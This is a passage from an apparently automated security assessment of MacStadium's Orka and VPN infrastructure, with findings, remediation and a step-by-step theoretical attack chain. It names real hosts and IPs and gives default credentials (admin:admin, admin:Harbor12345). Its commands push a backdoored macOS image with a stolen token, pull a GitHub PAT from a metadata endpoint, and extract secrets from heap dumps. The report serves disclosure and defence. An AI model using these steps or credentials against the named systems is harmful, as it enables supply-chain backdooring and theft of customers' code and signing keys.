| `packer-plugin` `config.go` Go constant | 2020-06-28 (initial release) | 2025-09-19 | 20 commits, never changed |
| `orka-images` workflow `sysadminctl -newPassword admin` | — | 2026-06-22 (HEAD) | Actively fixed for macOS 26 on 2026-05-06 (PR #26, SHA 71823e3a) |
| SKILL.md docs | — | current | Explicitly documents admin:admin |

PR #26 commit message: *"fix: use sysadminctl for password reset on macOS 26 (Tahoe) — dscl . -passwd requires the old password even as root on macOS 26 ... sysadminctl accepts explicit credentials and works correctly."* MacStadium updated the mechanism specifically to keep the password reset to `admin` working on macOS 26.

**Proof artifact:** `~/VDT/proofs/F19-admin-creds-proof.md`

**Images affected (published to `ghcr.io/macstadium/orka-images/`):**
- `tahoe:latest`, `tahoe:200-gb`
- `sequoia:latest`, `sequoia:200-gb`
- `sonoma:14.6` (latest)

**Supply chain attack path via self-hosted runner `arm-mini-002`:**

The workflow runs on `runs-on: [self-hosted, arm-mini-002]` — a MacStadium-owned Mac Mini that has `orka-engine` installed and can:
- Pull/run/save/push VM images directly
- Authenticate to `ghcr.io/macstadium/orka-images` using `GITHUB_TOKEN` with `packages: write`

Compromise of this runner (via F18 IMDS PAT theft or via `admin`/`admin` SSH into VMs it runs) allows pushing backdoored base images to `ghcr.io/macstadium/orka-images/*:latest`, affecting all Orka3 customers that deploy from those images.

**`orka-engine` as privileged bypass tool:**  
The `orka-engine` binary operates directly on the host (not via the authenticated Orka API). With shell access on `arm-mini-002`, an attacker can invoke `orka-engine vm run`, `orka-engine image push`, etc. without going through Orka3 JWT authentication at all.

```bash
# On runner arm-mini-002 (bypasses Orka API auth entirely):
orka-engine image pull ghcr.io/macstadium/orka-images/sequoia:latest
# ... inject backdoor into pulled image ...
orka-engine image push --username <actor> --password $GITHUB_TOKEN \
  modified-sequoia ghcr.io/macstadium/orka-images/sequoia:latest
```

**Impact:** All Orka3 customers deploying VMs from official base images receive backdoored macOS environments. Persistence via the VM's `admin` account with a known password; lateral movement to customer code signing keys, Apple Developer certificates, CI/CD secrets.

**Remediation:**
1. Remove the `admin`/`admin` hardcoded password reset — use `VM_DEFAULT_PASSWORD` secret for the new password and rotate it per-image-build
2. Protect `arm-mini-002` runner with Orka network isolation; restrict `orka-engine` binary to a dedicated service account
3. Require image signature verification (Cosign) before any customer VM pulls from `ghcr.io/macstadium/orka-images`
4. Audit all images currently published under `ghcr.io/macstadium/orka-images` for any unauthorized modifications

---

## Attack Chain (Full Theoretical Path)

```
[External]
    │
    ▼
[1] Craft unsigned SAML Response (F1: no signature validation)
    targeting MacStadium-SSO-VPN ACS endpoint
    │
    ▼
[2] VPN session established (F3: no posture check; F4: sdesktop bypass)
    → Now on MacStadium internal network (10.221.188.x reachable)
    │
    ▼
[3] Probe http://10.221.188.20/api/v1/cluster-info (unauthenticated)
    → Receive K8s CA cert
    │
    ▼
[4] Forge Orka JWT (F6: CVE-2020-26160, HS256 empty/weak secret)
    admin@macstadium.com email claim, no aud → passes VerifyAudience
    │
    ▼
[5] Enumerate all customer VMs via /api/v1/namespaces/orka-default/vms
    → Customer source code, CI/CD secrets, build artifacts
    │
    ▼
[5a] Dump K8s secrets: GET /api/v1/namespaces/orka-default/secrets
    → regcred secrets contain ghcr.io GitHub PATs (ghp_* format)
    → GitHub PAT pivot: read private macstadium org repos, CI workflows, source code
    │
    ▼
[5b] Test Harbor default credentials: admin:Harbor12345 @ http://10.221.188.5:30080
    → If successful: push malicious macOS base image to orka-images/sonoma:latest
    → Supply chain: all customers deploying VMs receive backdoored macOS layer
    │
    ▼
[5c] pprof heap dump: http://10.221.188.20/debug/pprof/heap
    → Extract ORKA_TOKEN from in-memory Buildkite CI bootstrap process (F17)
    → Extract forwarded SSH private keys from CI agent memory
    → Pivot to Buildkite host infrastructure via extracted keys
    │
    ▼
[5d] Inside any Orka VM (SSH admin:admin OR API pod exec):
    → curl http://169.254.169.254/metadata/github_pat (F18)
    → PAT → GitHub runner registration token → malicious runner injection
    → All secrets in customer GitHub org CI workflows exfiltrated
    │
    ▼
[5e] SSH admin:admin into ANY customer Orka VM (F19: hardcoded at build time)
    → Instant shell access — no brute force needed
    → Extract customer code, Apple signing certs, CI/CD credentials from running build
    │
    ▼
[6] K8s pod exec → virsh → arbitrary commands inside orka-vm containers
    → Lateral movement to all build servers in cluster
    → Extract customer code signing certificates, Apple Developer credentials, AWS/GCP keys
    │
    ▼
[7] arm-mini-002 runner compromise (via F18 IMDS pivot or F19 admin:admin SSH):
    → orka-engine image push backdoored sequoia:latest → ghcr.io/macstadium/orka-images
    → Supply chain: all future customer VM deployments receive persistent backdoor
```

**Blockers (as of 2026-08-17):**
- Step 1: SAML ACS submission not attempted (active exploitation prohibited on live third-party)
- Step 4: JWT secret not cracked (FILL_IN_LOCALLY placeholder in module)
- Steps 5-6: Internal network not reachable without VPN access

---

## Remediation Priority

| Priority | Finding | Action |
|----------|---------|--------|
| CRITICAL | F6 (empty JWT secret + CVE-2020-26160) | Rotate Orka JWT secret immediately; upgrade jwt-go to golang-jwt/jwt v4+ |
| CRITICAL | F1 + F2 combined | Register IdP metadata on both ASAs, enable assertion signing immediately |
| HIGH | F5 (CSRF) | Verify/enforce portal CSRF on ASA 9.14+ |
| MEDIUM | F3 (no posture) | Deploy HostScan + DAP on both ASAs |
| MEDIUM | F4 (sdesktop) | Enforce signed sdesktop token post-F3 |
| MEDIUM | F10 (HttpOnly) | Set HttpOnly on CSRFtoken cookie |
| MEDIUM | F13 (CRL partial) | Switch to OCSP stapling; configure redundant CRL endpoints |
| HIGH | F14 (Harbor HTTP + default creds) | Enable TLS on Harbor; rotate admin password; rotate regcred secrets |
| HIGH | F17 (SSH agent forwarding + ORKA_TOKEN in CI env) | Remove `-A` from bootstrap.sh; per-job short-lived SA tokens; migrate to HTTPS |
| HIGH | F18 (GitHub PAT via IMDS + runner injection) | Replace PAT with GitHub App installation token; pin third-party action to commit SHA |
| HIGH | F19 (admin:admin hardcoded at build time + supply chain runner) | Remove hardcoded new password; require Cosign image signing; isolate arm-mini-002 |
| LOW | F7, F12, F11 | Remove internal host hardcoding from public binary |

---

## Documentation

- **ASA endpoints:** `atl-vpn.macstadium.com` (207.254.16.2), `vpn.macstadium.com` (207.254.35.12)
- **Orka binary RE:** `~/VDT/tools/orka3/orka3` + `~/VDT/tools/ablation/modules/orka_oidc_re.py`
- **Ablation modules run:** saml-sp-all, saml-metadata, cstp-all, tunnel-groups-all, asa-version-all, webvpn-js-all, orka-binary-re, oidc-discovery, radius-re-all, radius-coa, username-oracle-all, cert-map-all, crl-bypass-all, go-re, jwt (forge), orka-oidc
- **Prior MacStadium assessment:** `~/VDT/assessments/MACSTADIUM-INFRASTRUCTURE-ASSESSMENT.md`

**Assessor:**  VDT Pipeline
**Assessment complete:** 2026-08-17 19:55 CDT
